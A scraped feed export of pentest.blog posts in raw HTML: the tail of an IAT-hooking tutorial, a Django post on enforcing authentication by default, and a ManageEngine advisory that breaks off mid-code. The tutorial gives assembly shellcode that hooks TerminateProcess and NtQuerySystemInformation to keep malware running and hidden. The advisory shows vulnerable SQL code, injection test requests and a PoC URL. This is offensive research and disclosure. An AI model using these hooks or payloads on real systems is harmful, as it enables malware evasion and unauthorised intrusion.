Swap</li>\n<li>Import Address Table (IAT)</li>\n<li>VEH</li>\n</ul>\n<p>This article will be focusing on IAT hooking among these methods. This particular method can be explained as manipulating the import address table for redirecting API functions into a desired memory address. This address can be another API function, a malicious shellcode or simply another part of the program code.Â In order to overwrite a address inside the IATÂ  the first step is finding the address of IAT table inside the process memory.Â  Finding any table inside a PE files requires lots of structure parsing, luckily find IAT address is easier than most because it can be found in data directories located inside the optional header of PE file.</p>\n<p><img class=\"aligncenter size-full wp-image-1450\" src=\"https://pentest.blog/wp-content/uploads/Structure-of-the-PE-optional-header-and-location-of-the-IAT.png\" alt=\"\" width=\"845\" height=\"408\" /></p>\n<p>But finding the import address table is simply not enough for hooking a API function. As mentioned in the beginning of this article this table only contains API addresses. In order to replace a API function address we need to know which entry belongs to the API function that will be hooked. After digging into the PE format it can be found that the order of the addresses inside import address table is same with import names table (INT). Parsing the import names table and finding the entry number of desired API function will be the solution.</p>\n<p><img class=\"aligncenter size-full wp-image-1219\" src=\"https://pentest.blog/wp-content/uploads/ImageExportDescriptor.png\" alt=\"\" width=\"789\" height=\"548\" srcset=\"https://pentest.blog/wp-content/uploads/ImageExportDescriptor.png 789w, https://pentest.blog/wp-content/uploads/ImageExportDescriptor-300x208.png 300w, https://pentest.blog/wp-content/uploads/ImageExportDescriptor-768x533.png 768w\" sizes=\"(max-width: 789px) 100vw, 789px\" /></p>\n<p>Finding a function name inside import names table (INT) requires parsing the <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">_IMAGE_IMPORT_DESCRIPTOR</code> structure inside the import table of a PE file. This may be little challenging when trying to perform this method with a reflective assembly code. More detailed reference can be found for parsingÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">_IMAGE_IMPORT_DESCRIPTOR</code> structure in <a href=\"https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/\">Art of Anti Detection 3 &#8211; Shellcode Alchemy</a>Â article. After parsing necessary structures and finding the API function index inside IAT there exists another step needs to be performed before overwriting the function address. Normally import address table is located in memory with only read permissions, in order to overwrite a entry inside the tableÂ  memory protection attributesÂ needs to be committed as <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">PAGE_READWRITE</code>. With the help ofÂ  <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">VirtualProtectÂ </code>functionÂ memory protection attributes of the IAT (or just the entry that needs to be overwritten) can be changed. In order to call this function whit using reflective assembly the <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm\">block_api</a>Â or <a href=\"https://github.com/EgeBalci/IAT_API\">iat_api</a>Â can be used.Â  Usage of the assembly blocks are explained in earlier articles. IÂ took the time and effort for writing a assembly block called <a href=\"https://github.com/EgeBalci/Hook_API\">hook_api</a> for hooking IAT entries with steps explained here.Â  Same as other assembly blocks this one also uses the ROR13 hash values to locate the index of a desired API function inside INT. Existence of this block makes developing IAT hooking shellcodes much easier, as explained in the beginning of this article IAT hooking can be used in many situations such as abusing application logic, privilege escalation and self defense inside unprivileged states.</p>\n<h3>Â Self Defense</h3>\n<p>Following piece of code uses the hook_api to redirect <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">TerminateProcess</code> API calls to a simple message box shellcode. Hooking such function prevents host process to terminate other running programs. This could be used as a self defense mechanism for infiltration softwares.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"asm\">[BITS 64]\n\n  cld                         ; Clear direction flags\n  push r10                    ; Save R10\n  call start                  ; ...\n  %include \"hook_api.asm\"\nstart:\n  pop rbp                     ; Pop the address of hook_api to RBP\n  call get_funny_func         ; Get the address of funy_func to stack\nfuny_func:\n  incbin \"MessageBox64\"       ; MessageBox shellcode (binary's name)\nget_funny_func:\n  mov r10d,0x5ECADC87         ; hash( \"KERNEL32.dll\", \"TerminateProcess\" )\n  call rbp                    ; hook_api(\"TerminateProcess\",\"funy_func\")\n  pop rax                     ; Clear the stack\n  pop r10                     ; Restore R10\n  ret                         ; Return to caller</pre>\n<p>After assembling the shellcode with <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">nasm -f bin TerminateProcessHook.asm</code>Â command, a simple shellcode <a href=\"https://github.com/EgeBalci/Injector\">injector</a> program is used for executing the payload inside the task manager application. There are many different methods for injecting the shellcode into a running process such as using <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1\">powersploit</a>Â , <a href=\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-Shellcode.ps1\">empire</a>Â or <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/payload_inject.rb\">metasploit</a>Â it is just a matter of choice. Running such injection on a continuous loop may be used to prevent premature termination of your infiltration software against user-land analysis and management tools.</p>\n<h3>Hiding in Plain Sight</h3>\n<p>Another creative way of using IAT hooking methods can be hiding your malicious process against analysis and management tools. For most programs hooking theÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">NtQuerySystemInformation</code>Â API will prevent the retrievalÂ  of any system information thus making the program unable to view any specs of our process.Â  Following piece of code uses the hook_api to redirect <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">NtQuerySystemInformation</code>Â API calls to a blank function witch only returns theÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">NT_SUCCESS</code>Â value upon calling.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"asm\">[BITS 64]\n\n  cld                     ; Clear direction flags\n  push r10                ; Save R10\n  call start              ; ...\n  %include \"hook_api.asm\"\nstart:\n  pop rbp                 ; Pop the address of hook_api to RBP\n  call get_funny_func     ; Get the address of funy_func to stack\nfuny_func:\n  mov rax,0x3FFFFFFF      ; Return NT_SUCCESS \n  ret                     ; ...\nget_funny_func:\n  mov r10d,0x95513E5D     ; hash( \"KERNEL32.dll\", \"NtQuerySystemInformation\" )\n  call rbp                ; hook_api(\"TerminateProcess\",\"funy_func\")\n  pop rax                 ; Clear the stack\n  pop r10                 ; Restore R10\n  ret                     ; Return to caller</pre>\n<p>After assembling and injecting the above shellcode into the task manager process the program is no longer able to view process three or any kind of information about a running program.Â Running such injection on a continuous loop may be used to hide a process fromÂ user-land analysis and management tools.</p>\n<p><iframe src=\"https://www.youtube.com/embed/crUqjE3S1Sw\" width=\"560\" height=\"315\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\"></iframe></p>\n<h3>Conclusion</h3>\n<p>Different attack scenarios can be formed with performing IAT hooking, the only limit is attackers imagination <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> Following list of API&#8217;s hold very good potential when trying to manipulate application logic with IAT hooking.</p>\n<ul>\n<li>OpenProcess (Prevent opening other processes)</li>\n<li>CreateThread</li>\n<li>CreateProcess</li>\n<li>WinHttpOpen (Disable SSL)</li>\n<li>getaddrinfo (DNS spoof)</li>\n<li>DeleteFileW (Prevent user deleting files)</li>\n<li>WinVerifyTrust (Bypass certificate checks)</li>\n</ul>\n<p>The privilege phishing is another attackÂ  that can be done with IAT hooking with the help of <a href=\"https://github.com/EgeBalci/Hook_API\">hook_api</a>. The term &#8220;Privilege Phishing&#8221; may sound strange, it means tricking the user into escalating the attackers privileges inside the infiltrated system. But on its own it will be another articles topic.</p>\n","descriptionType":"html","publishedDate":"Fri, 19 Oct 2018 09:22:08 +0000","feedId":11893,"bgimg":"https://pentest.blog/wp-content/uploads/Structure-of-the-PE-optional-header-and-location-of-the-IAT.png","linkMd5":"1cb4056b55bc4aa1e4174035918387a5","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn44@2020_5/2020/08/25/01-41-27-861_e19647a3bc859c9b.webp","destWidth":845,"destHeight":408,"sourceBytes":18377,"destBytes":25320,"author":"Ege Balci","articleImgCdnMap":{"https://pentest.blog/wp-content/uploads/Structure-of-the-PE-optional-header-and-location-of-the-IAT.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn44@2020_5/2020/08/25/01-41-27-861_e19647a3bc859c9b.webp","https://pentest.blog/wp-content/uploads/ImageExportDescriptor.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn31@2020_4/2020/08/25/01-41-48-341_37a8b66df4604e87.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp"},"publishedOrCreatedDate":1598319687288},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Why Secure Design Matters ? Secure Approach to Session Validation on Modern Frameworks (Django Solution)","link":"https://pentest.blog/?p=2377","description":"\n<p>I&#8217;ve been doing security researches on softwares for a quite long time. During these researchs, I often find myself in a situation where in I think about the state of mind of developers, problems that occur during developments and core problems of nature of software crafting teams. Thinking about these questions always lead me to realize possible software bugs.</p>\n\n\n\n<p><s>People</s> developers are tend to make mistakes by the nature of  human being. Mistakes made by developers usually end up with software bugs. If there is a software bug, security researchers always try to take an advantage of this bugs and convert it to a software vulnerability. For that reason, I always start my research by defining a places in softwares where things left to the developer&#8217;s initiative. One of good the example for that &#8216;places&#8217;, which also main focus of this post, can be a session validations.</p>\n\n\n\n<span id=\"more-2377\"></span>\n\n\n\n<blockquote class=\"wp-block-quote\"><p> How does the application validate the session of user ?</p></blockquote>\n\n\n\n<p>It&#8217;s very simple questions yet the answer is vary.. Let me give you couple of answers that I&#8217;ve seen in my life. I&#8217;ll try to give a source code examples with different programming languages. But this post does not focus on technology stack, it focus the approach. So programming language shouldn&#8217;t make any difference <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png\" alt=\"ðŸ˜Š\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<h4>#1 &#8211; Approaches in Controllers</h4>\n\n\n\n<p>Yes, as you know, you can easily check whether user has a valid session or not within controller. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"false\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">class UserController extends Controller\n{\n    public function show($id)\n    {\n        if (! Auth::check()) {\n            // The user is NOT. logged in...\n        }\n        return view('user.profile', ['user' => User::findOrFail($id)]);\n    }\n}</pre>\n\n\n\n<p>Of course, this approach is silly. But there is a lot of developers out there who are doing this&#8230; At some point, I believe, almost every single developers remember Don&#8217;t Repeat Yourself rule and try to get ride off that repetitive code. First solution that pops in minds is usage of decorators. Instead of calling piece of code that check existence of session, you can define it as a function and you can call it as a decorator.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">@flask_app.route('/log_browser/validate', methods=['POST'])\n@login_required\ndef user(request, pk):\n    # Do stuff in here\n    return User.query.get(pn)</pre>\n\n\n\n<p>Good. But don&#8217;t you feel like still repeating yourself ? %90 of endpoints you have in your application will require a valid session. Why would you call decorator every single time ? On the other hand, what will happen if you forget to call decorator ? 1,5 year ago I&#8217;ve found a 0day Remote Code Execution vulnerability because developer has forgotten to call one specific decorator <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> (<a href=\"https://pentest.blog/unexpected-journey-3-visiting-another-siem-and-uncovering-pre-auth-privileged-remote-code-execution/\">Click here to read full story about that 0day vulnerability</a>.) </p>\n\n\n\n<p>In order to less repeat yourself, second approach you can follow is create a two different controller as follow.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"false\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">class PubliclyAccessibleController extends Controller{\n    function __construct(){\n        if (! Auth::check()) {\n            return redirect_to_login();\n        }\n    }\n}\n\nclass AuthenticatedController extends Controller{\n    \n}\n\nclass UserController extends AuthenticatedController\n{\n    public function show($id)\n    {\n        return view('user.profile', ['user' => User::findOrFail($id)]);\n    }\n}</pre>\n\n\n\n<p>This is a better approach for sure. But it has couple of downsides. If you want to have publicly accessible endpoint, which means anonymous user can interact with it, you must inherit PubliclyAccessibleController. That may looks like right at the first glance but I&#8217;ve seen that approach cause a trouble too. Think about engineering cultures of developer teams. What will happen if you have a new developer on your team ?  Do you believe that new people joined to the team will know that they should inherit AuthenticatedController ? More and more questions pops in my mind about documentation, code reviews etc etc.</p>\n\n\n\n<p>Solutions must be improved.</p>\n\n\n\n<h4>#2 &#8211; Approaches in Middleware/Filter</h4>\n\n\n\n<p>I believe everyone know and/or feels that the problem should be taken care off before controllers. Before execution of controller, we have routing definitions where we can try to solve that problem. </p>\n\n\n\n<p>You have routes where you define path mapping to the controllers. Some frameworks defines routing in xml configurations while others have them in code base. Theoretically, by using capabilities of frameworks we can validate session before execution of the controller. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">Route::group(['middleware' => 'auth'], function () {\n    // Logout\n    Route::get('admin/platform/create', \n    // Article index\n    Route::get(\"admin/article\", 'AdminController@allArticle');\n    // Article create and store\n    Route::get('admin/article/create', 'ArticleController@create');\n});</pre>\n\n\n\n<p>Any of the given route in the list requested by a user, framework executes middleware named as auth. Within the auth middleware we perform session validation. So that we can validation session before execution of the controller. You don&#8217;t need to think about session decorators or controller inheritance anymore. But you have to put route in a proper routing list every single time in order to have session validation, which is still a task to done by developers.</p>\n\n\n\n<p>Instead of waiting stuff from developer in order to have a session validation on new endpoint, we should change our software design to enforce authentication by default! So that developers should work for to have anonymously accessible endpoint.</p>\n\n\n\n<h3>Let&#8217;s Force Authentication By Default !</h3>\n\n\n\n<p>So far, I&#8217;ve tried to explain why we should change our design by giving different approaches and their problems. </p>\n\n\n\n<ul><li>We must forcefully enable session validation for every endpoint.</li><li>Developers must do something to make it publicly accessible instead of making it authentication protected !</li><li>We should do this in filter/middlewares.</li></ul>\n\n\n\n<p>I&#8217;ve developed a small Django package. It&#8217;s quite small one. Once you get the idea, you can develop the same one for different language/frameworks easily. (<a href=\"https://github.com/mmetince/django-forceauth\">https://github.com/mmetince/django-forceauth</a>)</p>\n\n\n\n<p>I&#8217;ve created one decorator and one mixing.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"false\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">def publicly_accessible_endpoint(view_func):\n    return view_func\n\nclass PubliclyAccessibleEndpointMixin:\n    publicly_accessible_endpoint = None</pre>\n\n\n\n<p>They do literally nothing. But they provide you the way to tell middleware that the endpoint want to be anonymously accessible !</p>\n\n\n\n<p>Now we have middleware where we have the magic.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"false\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">from django.conf.global_settings import LOGIN_URL\nfrom django.http import HttpResponseRedirect\nfrom django.utils.deprecation import MiddlewareMixin\n\nclass ForceAuthenticationMiddleware(MiddlewareMixin):\n    \"\"\"\n    Bla bla bla\n    \"\"\"\n    def process_view(self, request, view_func, view_args, view_kwargs):\n        # If it's authenticated user we don't have to do anything.\n        if request.user.is_authenticated:\n            return None\n        # We need to decide that view is function or class. Easiest way to do it check existince\n        # of view_class attribute of view_func. While __global__ exist on every object,\n        # Class-based-views only have view_class.\n        if hasattr(view_func, 'view_class'):\n            if not hasattr(view_func.view_class, 'publicly_accessible_endpoint'): return HttpResponseRedirect(LOGIN_URL)\n        else:\n            if 'publicly_accessible_endpoint' not in view_func.__globals__: return HttpResponseRedirect(LOGIN_URL)</pre>\n\n\n\n<p>That middleware is being executed before view call. It checks attributes of mapped view. If the view doesn&#8217;t have &#8216;publicly_accessible_endpoint&#8217; attribute, which they can be given by calling above decorator and mixing, it redirect user back to login without continue to execution.</p>\n\n\n\n<p>For example, lets say you have a one function-based-view. If you call publicly_accessible_endpoint decorator, it will the middleware that don&#8217;t do session validation for that endpoint .</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"false\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">@publicly_accessible_endpoint\ndef user(request):\n    ...\n    return render(request, 'user', context={})</pre>\n\n\n\n<p>Same can be done easily for Class-Based-Views.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"false\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">class AuthLoginView(LoginView, PubliclyAccessibleEndpointMixin):\n    pass</pre>\n\n\n\n<p>Thanks for reading !</p>\n","descriptionType":"html","publishedDate":"Sun, 08 Sep 2019 11:30:08 +0000","feedId":11893,"bgimg":"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png","linkMd5":"635332ab66c916c9c645a68174c33f15","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn64@2020_1/2020/08/25/01-41-27-387_ecea8533d7c020cb.webp","destWidth":72,"destHeight":72,"sourceBytes":796,"destBytes":1690,"author":"Mehmet Ince","articleImgCdnMap":{"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn64@2020_1/2020/08/25/01-41-27-387_ecea8533d7c020cb.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp"},"publishedOrCreatedDate":1598319687283},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Advisory | ManageEngine Applications Manager Remote Code Execution and SQLi","link":"https://pentest.blog/?p=1311","description":"<p>It is an interesting coincidence that almost 1 year ago we identified a critical security issue in a different product (Eventlog Analyzer) of this company. Now, this time we&#8217;ve came across with another product of this company during penetration test. To be honest I&#8217;ve seen more than 20 different high/critical vulnerability during the analysis of the product but I will only share two of them now, as a full disclosure.<span id=\"more-1311\"></span></p>\n<h3>Advisory Informations</h3>\n<p><strong>Remotely Exploitable:</strong> Yes<br />\n<strong>Authentication Required:</strong> NO<br />\n<strong>Vendor URL:</strong> https://www.manageengine.com/products/applications_manager/download.html<br />\n<strong>CVSSv3 Score:</strong>Â 10.0<br />\n<strong>Date of found:</strong>Â 07 Mar 2018</p>\n<h3>Technical Details</h3>\n<h4>Vulnerability #1 &#8211; Unauthenticated SQL Injection (BONUS!)</h4>\n<p>I do always start the analysis by reading web.xml files. That will give you abstract level of idea what the heck is happening within the software. Following definition was quite interesting for me.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">...\n&#60;action path=\"/jsonfeed\" type=\"com.adventnet.appmanager.struts.actions.JSONFeed\" scope=\"request\" parameter=\"method\"&#62;\n&#60;/action&#62;\n...</pre>\n<p>While I was reviewing the class I immediately detect multiple potential SQLi issue. Here is one example.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\" data-enlighter-highlight=\"7-9,14-15\">public void getConsoleJSONFeed(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)\n    throws Exception\n  {\n    StringBuffer jsonStr = new StringBuffer();\n    try\n    {\n      String toReturn = request.getParameter(\"toReturn\");\n      String mgId = request.getParameter(\"mgId\");\n      String monType = request.getParameter(\"category\");\n      \n      String query = null;\n      if ((toReturn != null) &#38;&#38; (toReturn.equals(\"allMGResource\"))) {\n        query = \"select RESOURCENAME,RESOURCEID,TYPE from AM_ManagedObject where AM_ManagedObject.TYPE='HAI'\";\n      } else if ((toReturn != null) &#38;&#38; (toReturn.equals(\"allMonInMG\"))) {\n        query = \"select RESOURCENAME,RESOURCEID,TYPE from AM_ManagedObject, AM_PARENTCHILDMAPPER where AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.CHILDID and AM_PARENTCHILDMAPPER.PARENTID='\" + mgId + \"' and AM_ManagedObject.TYPE in \" + Constants.serverTypes;\n      } else if ((toReturn != null) &#38;&#38; (toReturn.equals(\"OpManResource\"))) {\n        if (monType != null)\n        {\n          monType = \"OpManager-\" + monType;\n          query = \"select RESOURCENAME,RESOURCEID,SUBSTRING(AM_ManagedObject.TYPE,11),AM_AssociatedExtDevices.IPADDRESS from AM_ManagedObject, AM_PARENTCHILDMAPPER, AM_AssociatedExtDevices, ExternalDeviceDetails where AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.CHILDID and AM_PARENTCHILDMAPPER.PARENTID='\" + mgId + \"' and AM_ManagedObject.TYPE like 'OpManager-%' and AM_AssociatedExtDevices.RESID=AM_PARENTCHILDMAPPER.CHILDID and AM_AssociatedExtDevices.IPADDRESS=ExternalDeviceDetails.IPADDRESS and ExternalDeviceDetails.CATEGORY='\" + monType + \"'\";\n        }\n        else if (mgId == null)\n        {\n          query = \"select RESOURCENAME,RESOURCEID,SUBSTRING(TYPE,11),IPADDRESS from AM_ManagedObject,AM_AssociatedExtDevices where AM_ManagedObject.TYPE like 'OpManager-%' and AM_AssociatedExtDevices.RESID=AM_ManagedObject.RESOURCEID\";\n        }\n        else\n        {\n          query = \"select RESOURCENAME,RESOURCEID,SUBSTRING(TYPE,11),IPADDRESS from AM_ManagedObject,AM_AssociatedExtDevices,AM_PARENTCHILDMAPPER where AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.CHILDID and AM_AssociatedExtDevices.RESID=AM_ManagedObject.RESOURCEID and AM_PARENTCHILDMAPPER.PARENTID='\" + mgId + \"' and AM_ManagedObject.TYPE like 'OpManager-%'\";\n        }\n      }\n      ArrayList monList = this.mo.getRows(query);\n...</pre>\n<p>Since I was familiar with the ManageEngine company&#8217;s product, I knew how to trigger this section of the class.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">GET /jsonfeed.do?method=getParentGroups&#38;haid=10000055 HTTP/1.1\nHost: 12.0.0.226:9090\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\n--\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nSet-Cookie: JSESSIONID_APM_9090=88629946E13962211BA3562D33EB2ED8; Path=/; HttpOnly\nCache-Control: max-age=0, no-cache, no-store, must-revalidate\nExpires: 0\nPragma: no-cache\nContent-Type: text/html;charset=UTF-8\nContent-Length: 32\nDate: Wed, 07 Mar 2018 19:54:13 GMT\nConnection: close\n\n{\"0\":[\"Applications Manager\"]}\n</pre>\n<p>How did I know that I can access this end-point without authentication ? That question is not something that I want to jump-in right now. I started exploiting this SQLi issue manually but somehow I wasn&#8217;t receiving expected behavior. Thus, I&#8217;ve decided to understand what kind of sql query was received by RDMS.</p>\n<p>Protip: Do not try to patch application or change configuration of RDMS service. These kind of product always logs error. So you just need to find a log file location and trace it.</p>\n<p>Here is the what I&#8217;ve seen when I send following payload.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">12.0.0.226:9090/jsonfeed.do?method=getParentGroups&#38;haid=10000055%27%22%3C%3E</pre>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">root@asd:/opt/ME/AppManager13/AppManager13# tail -f logs/swissql00.log\n\n\nMar 07, 2018 11:59:35 AM com.adventnet.appmanager.db.AMConnectionPool executeQueryStmt\nSEVERE: [SQL ERROR] select RESOURCENAME,RESOURCEID from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.CHILDID='10000055&#38;#39;&#38;quot;&#38;lt;&#38;gt;' and AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.PARENTID and AM_ManagedObject.TYPE='HAI'\norg.postgresql.util.PSQLException: ERROR: invalid input syntax for integer: \"10000055&#38;#39;&#38;quot;&#38;lt;&#38;gt;\"\n  Position: 110\n  at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102)\n  at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835)\n  at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)\n  at org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500)\n</pre>\n<p>Okay, this is awkward. You know that one of most common mottos of the application security is &#8220;Validate input, encode output&#8221;. But it seems, whoeverÂ has tried to apply this motto into this project has mind-confusion. Such global modification of inputs can cause more trouble then you can imagine. But in this case,Â developers made two completely unrelated mistakes. First one cause a SQLi. But second one, a stroke of luck, makes first one impossible to exploit.</p>\n<p>Obviously, this is unexploitable vulnerability. Okay&#8230; So we just need to find a following things at the same time so we could have SQLi.</p>\n<ol>\n<li>We don&#8217;t have any credentials. Authenticated SQLis are of the table (I&#8217;ve seen 50+ authenticated SQLi during this analysis)</li>\n<li>It seem special characters, such as quotes, are globally encoded. So we need to find a sql query that takes user input without surrounding any quotes. (Protip: Look for integer inputs <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></li>\n</ol>\n<p>Within a several seconds, I&#8217;ve detected following public method of same class.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\" data-enlighter-lineoffset=\"7,11\">public void getMonitorCount(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)\n   throws Exception\n {\n   JSONObject count = new JSONObject();\n   AMConnectionPool cp = AMConnectionPool.getInstance();\n   ResultSet result = null;\n   String haid = request.getParameter(\"haid\");\n   if (haid == null) {\n     haid = \"0\";\n   }\n   String query = \"select \\\"SYS\\\",count(*) from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.PARENTID=\" + haid + \" and AM_PARENTCHILDMAPPER.CHILDID=AM_ManagedObject.RESOURCEID and type in\" + Constants.serverTypes + \" union select \\\"APP\\\",count(*) from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.PARENTID=\" + haid + \" and AM_PARENTCHILDMAPPER.CHILDID=AM_ManagedObject.RESOURCEID and type not in \" + Constants.serverTypes + \" and type not like '%OpManager%' union  select \\\"NWD\\\",count(*) from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.PARENTID=\" + haid + \" and AM_PARENTCHILDMAPPER.CHILDID=AM_ManagedObject.RESOURCEID and type like '%OpManager%'\";\n   try\n   {\n     result = AMConnectionPool.executeQueryStmt(query);\n     while (result.next()) {\n       count.append(result.getString(1), result.getString(2));\n     }\n     try\n     {\n       if (result != null) {\n         result.close();\n       }\n     }\n     catch (Exception e)\n     {\n       e.printStackTrace();\n     }\n     out = response.getOutputStream();\n   }</pre>\n<p>Look for theÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">haid</code> parameter at the middle of the SQL query. You can see that it&#8217;s not given into the query within single/double quotes. Which means we don&#8217;t need to escape from anything. It&#8217;s quite possible to directly modify the query.</p>\n<p><em>Most funny thing about this case is that the final query was designed only for MsSQL. But this product also support Postgresql&#8230; Actually, it&#8217;s shipped with psql.</em></p>\n<p>POC URL</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">http://12.0.0.226:9090/jsonfeed.do?method=getMonitorCount&#38;haid=10000055</pre>\n<h4>Vulnerability #2 &#8211; Unauthenticated Remote Code Execution</h4>\n<p>While I was poking around, I&#8217;ve realised that testCredentials.do endpoint&#8217;s was accessible without having authentication cookie. Â So i thought it&#8217;s worth to give a try to dive into the business logic of this module.</p>\n<p><code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">TestCredentials</code> class have two different publicly accessible class method. Here is the most interesting one.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\" data-enlighter-highlight=\"7-10,19-26\">public ActionForward testCredentialForConfMonitors(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)\n  {\n    Properties authResult = new Properties();\n    String monType = null;\n    try\n    {\n      monType = request.getParameter(\"montype\");\n      if ((monType == null) || (monType.equalsIgnoreCase(\"null\"))) {\n        monType = request.getParameter(\"type\");\n      }\n      NewMonitorConf newMonConf = new NewMonitorConf();\n      if ((newMonConf.preConfMap.containsKey(monType)) || (monType.equalsIgnoreCase(\"node\")))\n      {\n        monType = newMonConf.getResourceTypeForPreConf(monType);\n        \n        authResult = newMonConf.getAuthResultAsPerResourceType(monType, request, true);\n      }\n      else\n      {\n        Properties props = NewMonitorConf.getClass(monType);\n        ArrayList args = NewMonitorUtil.getArgsforConfMon(monType);\n        String 